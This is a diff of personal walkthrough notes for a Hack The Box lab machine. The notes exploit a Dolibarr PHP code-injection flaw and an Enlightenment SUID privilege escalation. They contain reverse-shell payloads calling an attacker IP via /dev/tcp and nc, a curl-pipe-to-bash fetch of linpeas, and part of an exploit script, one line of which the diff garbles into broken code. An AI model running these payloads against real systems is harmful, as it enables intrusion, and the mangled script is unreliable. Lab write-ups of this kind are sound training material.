@@ -5,7 +5,7 @@
 		- can submit message (maybe RCE via that?)
 - dirbuster finds some js code files.
 - ffuf for fuzzing url
-	```bash
+	```
 ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.board.htb" -fs 15949
 ```
 	- We find crm.board.htb and att to /etc/hosts file
@@ -13,7 +13,7 @@ ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt  
 	- on searching google we see default creds is admin/admin
 	- We also see the version and on searching online we see it has a vulnerability : PHP code injection
 		- also has a github which automates it.
-			```bash
+			```
 https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
 ```
 		- pass after logging in with creds
@@ -35,7 +35,7 @@ OR
 <?php system(bash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'); ?>
 ```
 - main exploit (from writeup htb):
-	```bash
+	```
 <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
 10.10.14.25 4455 >/tmp/f");?
 ```
@@ -52,7 +52,7 @@ $dolibarr_main_db_pass='serverfun2$2023!!';
 ```
 - I checked /home and found a larissa directory which implies a user named larissa.
 	- Can also check(more ideal enumeration)
-		```bash
+		```
 cat /etc/passwd | grep "sh$" # or grep "sh" too
 ```
 		- shows user larissa can run bash
@@ -61,11 +61,11 @@ cat /etc/passwd | grep "sh$" # or grep "sh" too
 	- 
 ## Privilege Escalation
 - can send linpeas by first getting it from local machine, and starting a server:
-	```bash
+	```
 sudo python3 -m http.server 9898
 ```
 	- call linpeas from target
-		```bash
+		```
 wget http://10.10.14.25(source_ _addr):9898/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
@@ -73,13 +73,13 @@ OR
 curl http://10.10.14.25:9898/linpeas.sh|bash #to execute without downloading
 ```
 		- On enumerating we find some setuid files which are interesting. this can also be found by enumerating  with find for setuid:
-			```bash
+			```
 find / -type f -perm -4000 2>/dev/null
 ```
 			- We find an enlightenment file which is unusual
 				- can't execute this as www-data
 				- can check version with larissa
-					```bash
+					```
 englightenment --version
 ```
 				- we find it to be 0.23.1
@@ -87,7 +87,7 @@ englightenment --version
 	- We download from exploit.db url :
 		https://www.exploit-db.com/exploits/51180
 		- and send it to target just like we did with linpeas and www-data user. Need to edit the exploit to only include the bash code within it.
-			```bash
+			```
 wget http://10.10.14.25:9898/51180.txt
 cat 51180.txt # copy bash code only
 vi exploit.sh # paste bash code
@@ -100,14 +100,14 @@ whoami
 ---
 ## Root Priv Esc exploit in detail
 - **NOTE: We can understand why better from IPPSecs source code analysis which basically calls a bash file. (there is an even better explanation of the actual exploit for root which is shown below and explains the directory path having ;, and the weird // and all to bypass the codes restrictions to pass the exploit) long story short, in the main code it checks for the length which requires it to be around 6 characters and hence the extra // to pass that check. Many more checks  explained in his video and how this exploit passes through it.**
-	```bash
+	```
 #!/bin/bash
 echo "CVE-2022-37706"
 echo "[*] Trying to find the vulnerable SUID file..."
 echo "[*] This may take few seconds..."
 
 file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
-if [[ -z ${file} ]]
+if [ -z ${file} ](%20-z%20${file}%20)
 then
         echo "[-] Couldn't find the vulnerable SUID file..."
         echo "[*] Enlightenment should be installed on your system."
